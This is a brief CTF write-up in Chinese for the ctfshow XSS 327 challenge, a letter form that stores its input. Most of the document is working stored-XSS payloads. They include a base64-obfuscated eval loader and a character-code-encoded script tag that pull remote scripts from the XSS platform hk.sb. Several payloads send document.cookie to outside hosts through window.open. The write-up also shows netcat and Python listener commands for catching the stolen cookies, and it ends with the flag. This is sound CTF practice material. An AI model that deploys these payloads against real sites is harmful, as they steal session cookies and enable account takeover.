# ctfshow-xss327



##### 参考链接

其他大佬链接

feng  https://ego00.blog.csdn.net/article/details/114079028

Y4	 https://blog.csdn.net/solitudi/article/details/111568030?spm=1001.2014.3001.5501

bit   https://www.xl-bit.cn/index.php/archives/120/



```
请以小明的身份，给身在美国的表哥老明写一封信，介绍中国流行的网络梗，并邀请他回来一起去ctfshow玩。

发件人
请输入发件人
收件人
请输入收件人
我的天气
表哥回来时带的东西
  
暗网发送
信的内容
请输入内容
 
```

```html
既然前面是反射型xss  其实不管它是反射还是存储 
主要还是需要我们利用xss平台 获取cookie


xss平台
https://ww.rs/
https://hk.sb/


输入框输入
<Img sRC=//hk.sb/UfVb/test.jpg>

    
<input	onfocus=eval(atob(this.id))	id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vaGsuc2IveTd4eCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=	autofocus>

后面用了buu的公开靶机当个nc监听的服务器
nc -lvp 1104
正常的vps那边是需要nc的，但是nc好像不能持续接收，但是方法其实很多，可以重复起nc，或者我这边就临时拿python起一个临时的服务器，接收一下get参数：
python -m http.server 1104
<svg/onload="window.open('https://hk.sb/y7xx'+document.cookie)">
<body/onload="window.open('https://hk.sb/y7xx'+document.cookie)">

<svg/onload="window.open('http://node4.buuoj.cn:1104/'+document.cookie)">
    <svg	onload="window.open('http://3e8366a0-4e63-4eec-963d-6fa92cad126e.node4.buuoj.cn:1104/'+document.cookie)">
        
 
        
发件人 <sCRiPt/SrC=//hk.sb/y7xx>
收件人 admin
信的内容  <img src="" onerror="document.write(String.fromCharCode(60,115,67,82,105,80,116,32,115,82,67,61,47,47,104,107,46,115,98,47,121,55,120,120,62,60,47,115,67,114,73,112,84,62))">


ctfshow{958cf2f8-d9fd-4bb8-8af2-ed0281291771}
```

